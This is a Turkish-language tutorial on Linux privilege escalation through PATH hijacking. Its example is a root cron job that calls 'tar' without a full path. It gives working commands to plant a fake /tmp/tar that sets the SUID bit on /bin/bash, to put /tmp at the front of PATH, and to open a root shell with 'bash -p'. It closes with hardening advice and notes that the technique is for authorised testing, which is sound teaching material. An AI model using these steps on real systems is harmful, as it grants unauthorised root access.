PATH değişkenini kullanarak **privilege escalation (privesc)** gerçekleştirmek, özellikle yanlış yapılandırılmış veya güvensiz PATH kullanımları durumunda mümkündür. Bu teknik genellikle kullanıcı tarafından kontrol edilebilir bir dizinin PATH değişkenine eklenmiş olması veya komutların tam yollarının belirtilmemesi durumlarında işe yarar.

### **PATH Değişkeni Nedir?**
`PATH`, Linux veya Windows gibi işletim sistemlerinde komut satırında çalıştırılan komutların aranacağı dizinlerin bir listesidir. Örneğin, `ls` komutunu çalıştırdığınızda, işletim sistemi bu komutun nerede olduğunu öğrenmek için `PATH` değişkenine bakar.

---

### **Privesc Yöntemi**
#### **Adım 1: PATH Değişkenini Kontrol Etme**
Öncelikle, mevcut PATH değişkenini kontrol etmelisiniz:
```bash
echo $PATH
```

**Dikkat Edilecekler:**
- Kullanıcının yazma iznine sahip olduğu dizinler var mı? Örneğin `/tmp`, `/home/user/bin`.
- Boş PATH veya nokta (`.`) gibi bir giriş var mı? Bu, mevcut dizini arama sırasına dahil eder ve tehlikeli olabilir.

#### **Adım 2: Hedef Komutları Belirleme**
Yetkili bir kullanıcı veya root tarafından çağrılan bir komut hedef alınır. Örneğin:
- `sudo` komutları
- Cron görevleri
- Setuid bit ayarları olan uygulamalar

Bir script içinde çağrılan komutlar PATH'e bağlıysa ve tam yol belirtilmemişse, bu komutlar potansiyel hedeflerdir.

Örnek bir cron job:
```bash
* * * * * root backup.sh
```

Ve bu script içinde şunlar olabilir:
```bash
#!/bin/bash
tar -czf /root/backup.tar.gz /important/data
```

#### **Adım 3: Kendi Zararlı İkili Dosyanızı Oluşturma**
Hedeflenen komutun adında bir dosya oluşturun. Örneğin, yukarıdaki `tar` komutunu ele alalım. Zararlı bir `tar` scripti şöyle yazılabilir:
```bash
#!/bin/bash
chmod +s /bin/bash
```

Bu scriptin adı `tar` olarak kaydedilir:
```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/tar
chmod +x /tmp/tar
```

#### **Adım 4: PATH Değişkenini Manipüle Etme**
Eğer `PATH` kontrolünüz altındaysa veya bir cron job ile değiştiriliyorsa, kendi zararlı dosyanızın bulunduğu dizini PATH'e ekleyin:
```bash
export PATH=/tmp:$PATH
```

Bu işlem, sistemin `/usr/bin/tar` yerine `/tmp/tar` komutunu çalıştırmasına neden olur.

#### **Adım 5: Zararlı Kodun Çalıştırılması**
Eğer bir cron job tarafından veya sudo komutuyla PATH'e bağımlı bir komut çalıştırılırsa, bu zararlı script/ikili dosya yürütülür. Örneğin, `chmod +s /bin/bash` ile bash'e SUID yetkisi eklenir.

Artık şu komutla root shell elde edebilirsiniz:
```bash
/bin/bash -p
```

---

### **Örnek Senaryo**
#### **1. Zayıf Cron Job**
Bir cron job şu şekilde çalışıyor:
```bash
* * * * * root /usr/bin/backup.sh
```

Ve `backup.sh` içeriği:
```bash
#!/bin/bash
tar -czf /root/backup.tar.gz /important/data
```

#### **2. Zararlı Script Hazırlığı**
`/tmp` dizinine bir `tar` scripti koyun:
```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/tar
chmod +x /tmp/tar
```

#### **3. PATH'i Manipüle Etme**
Cron job, `/tmp` dizininin PATH değişkeninde öne alınmasını sağlıyorsa veya sizin kontrolünüzdeyse:
```bash
export PATH=/tmp:$PATH
```

#### **4. Root Yetkisi Kazanma**
Cron job çalıştığında `/tmp/tar` yürütülür ve `/bin/bash` SUID olarak ayarlanır. Daha sonra:
```bash
/bin/bash -p
```

---

### **Savunma Yöntemleri**
1. **Tam Yol Belirtin:** Scriptler ve cron job'larda komutların tam yolunu kullanın (örn: `/usr/bin/tar`).
2. **Güvenli PATH Ayarlayın:** `PATH` değişkenini sadece güvenilir dizinlerle sınırlandırın:
   ```bash
   export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   ```
3. **Yetkili Komutlarda PATH'i Kilitleyin:** Sudoers dosyasını düzenleyerek PATH değişkenini kilitleyin:
   ```bash
   Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
   ```
4. **Dosya İzinlerini Doğru Ayarlayın:** Kullanıcının yazma yetkisi olmayan dizinlerde PATH kullanın.
5. **Script Denetimleri Yapın:** Shell scriptlerini ve cron job'larını düzenli olarak gözden geçirin.

---

Bu yöntemle privesc gerçekleştirirken dikkatli olunmalı ve yalnızca eğitim veya yetkilendirilmiş test ortamlarında uygulanmalıdır.
